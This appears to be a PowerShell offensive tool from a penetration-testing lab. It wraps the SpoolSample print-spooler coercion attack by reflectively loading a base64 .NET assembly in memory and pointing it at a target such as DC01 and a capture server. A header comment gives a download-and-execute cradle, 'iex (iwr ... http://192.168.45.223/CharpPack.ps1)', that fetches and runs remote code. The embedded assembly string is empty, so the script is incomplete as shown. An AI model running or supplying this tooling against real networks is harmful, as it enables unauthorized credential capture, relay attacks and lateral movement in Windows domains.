
# iex (iwr -usebasicparsing http://192.168.45.223/CharpPack.ps1);
# Invoke-SpoolSample <Target> <CaptureServer>
# Invoke-SpoolSample DC01 FILES01

function Invoke-SpoolSample
{
    [CmdletBinding()]
    Param (
	[Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Target,
		
	[Parameter(Position = 1, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $CaptureServer
    )

    $base64binary=""
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))

    $Command = "$Target $CaptureServer"

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SpoolSample.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}



